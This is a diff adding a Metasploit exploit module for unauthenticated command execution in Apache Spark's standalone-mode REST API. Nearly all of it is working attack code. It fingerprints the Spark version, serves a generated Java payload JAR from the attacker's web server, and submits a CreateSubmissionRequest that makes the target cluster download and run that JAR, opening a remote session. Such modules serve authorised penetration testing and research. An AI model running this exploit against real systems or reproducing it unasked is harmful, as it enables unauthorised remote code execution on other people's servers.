@@ -1,0 +1,150 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpServer
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Apache Spark Unauthenticated Command Execution',
+      'Description'    => %q{
+          This module exploits an unauthenticated command execution vulnerability in Apache Spark with standalone cluster mode through REST API.
+          It uses the function CreateSubmissionRequest to submit a malious java class and trigger it.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'aRe00t',                            # Proof of concept
+          'Green-m <greenm.xxoo[at]gmail.com>' # Metasploit module
+        ],
+      'References'     =>
+        [
+          ['URL', 'https://www.jianshu.com/p/a080cb323832'],
+          ['URL', 'https://github.com/vulhub/vulhub/tree/master/spark/unacc']
+        ],
+      'Platform'       => 'java',
+      'Arch'           => [ARCH_JAVA],
+      'Targets'        =>
+        [
+          ['Automatic', {}]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Dec 12 2017',
+      'DefaultTarget'  => 0,
+      'Notes'          =>
+        {
+          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS],
+          'Stability'   => [ CRASH_SAFE ],
+          'Reliability' => [ REPEATABLE_SESSION]
+        }
+    ))
+
+    register_options [
+      Opt::RPORT(6066),
+      OptInt.new('HTTPDELAY', [true, 'Number of seconds the web server will wait before termination', 10])
+    ]
+
+  end
+
+  def check
+    return CheckCode::Detected if get_version
+    CheckCode::Unknown
+  end
+
+  def primer
+    path = service.resources.keys[0]
+    binding_ip = srvhost_addr
+
+    proto = datastore['SSL'] ? 'https' : 'http'
+    payload_uri = "#{proto}://#{binding_ip}:#{datastore['SRVPORT']}/#{path}"
+
+    send_payload(payload_uri)
+  end
+
+  def exploit
+    fail_with(Failure::Unknown, "Something went horribly wrong and we couldn't continue to exploit.") unless get_version
+
+    vprint_status("Generating payload ...")
+    @pl = generate_payload.encoded_jar(random:true)
+    print_error("Failed to generate the payload.") unless @pl
+
+    print_status("Starting up our web service ...")
+    Timeout.timeout(datastore['HTTPDELAY']) { super }
+  rescue Timeout::Error
+  end
+
+  def get_version
+    @version = nil
+
+    res = send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path),
+      'method'        => 'GET'
+    )
+
+    unless res
+      vprint_bad("#{peer} - No response. ")
+      return false
+    end
+
+    if res.code == 401
+      print_bad("#{peer} - Authentication required.")
+      return false
+    end
+
+    unless res.code == 400
+      return false
+    end
+
+    res_json = res.get_json_document
+    @version = res_json['serverSparkVersion']
+
+    if @version.nil?
+      vprint_bad("#{peer} - Cannot parse the response, seems like it's not Spark REST API.")
+      return false
+    end
+
+    true
+  end
+
+  def send_payload(payload_uri)
+    rand_appname   = Rex::Text.rand_text_alpha_lower(8..16)
+
+    data =
+    {
+      "action"                    => "CreateSubmissionRequest",
+      "clientSparkVersion"        => @version.to_s,
+      "appArgs"                   => [],
+      "appResource"               => payload_uri.to_s,
+      "environmentVariables"      => {"SPARK_ENV_LOADED" => "1"},
+      "mainClass"                 => "#{@pl.substitutions["metasploit"]}.Payload",
+      "sparkProperties"           =>
+      {
+        "spark.jars"              => payload_uri.to_s,
+        "spark.driver.supervise"  => "false",
+        "spark.app.name"          => rand_appname.to_s,
+        "spark.eventLog.enabled"  => "true",
+        "spark.submit.deployMode" => "cluster",
+        "spark.master"            => "spark://#{rhost}:#{rport}"
+      }
+    }
+
+    res = send_request_cgi(
+      'uri'           => normalize_uri(target_uri.path, "/v1/submissions/create"),
+      'method'        => 'POST',
+      'ctype'         => 'application/json;charset=UTF-8',
+      'data'          => data.to_json
+    )
+
+  end
+
+  # Handle incoming requests
+  def on_request_uri(cli, request)
+    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
+    send_response(cli, @pl)
+  end
+end
